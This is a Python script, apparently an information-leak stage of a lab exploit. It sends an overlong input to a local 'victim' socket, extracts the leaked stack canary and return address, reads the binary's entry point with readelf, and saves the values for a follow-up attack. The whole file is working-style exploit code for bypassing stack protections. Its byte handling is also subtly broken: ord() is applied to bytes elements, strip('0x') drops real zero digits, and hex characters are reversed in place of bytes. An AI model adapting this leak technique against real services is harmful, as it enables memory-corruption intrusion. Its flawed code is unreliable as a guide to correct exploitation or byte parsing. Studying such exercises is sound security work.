import socket
import sys, os

sock = os.getenv("HOME") + "/victim.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock)
str = b'A' * 24 + b'\n48\n'
s.send(str)
data = s.recv(1024)
s.close()

canary = ''
ret_addr = ''
valuebyte = ''

for i in range(48):
	this_byte = hex(ord(data[i]))
	if len(this_byte) == 3:
		this_byte = '0x0' + this_byte[2]
	valuebyte += this_byte + '\t'
	if i>23 and i<32:
		canary += this_byte.strip('0x')
	if i>39 and i<48:
		ret_addr += this_byte.strip('0x')
	if (i+1)%8 == 0:
		print(valuebyte)
		valuebyte = ''

os.system('readelf -a victim | grep -i "entry" > tmp')
binadd = open('tmp', 'r').read()
binadd = binadd.split(':')
print(binadd[1].strip())

write_to_file = '0x' + canary[::-1] + '\t0x' + ret_addr[::-1] + '\t' + binadd[1].strip() + '\n'

filename = '/tmp/someData.txt'
with open(filename, 'w') as file_object:
    file_object.write(write_to_file)
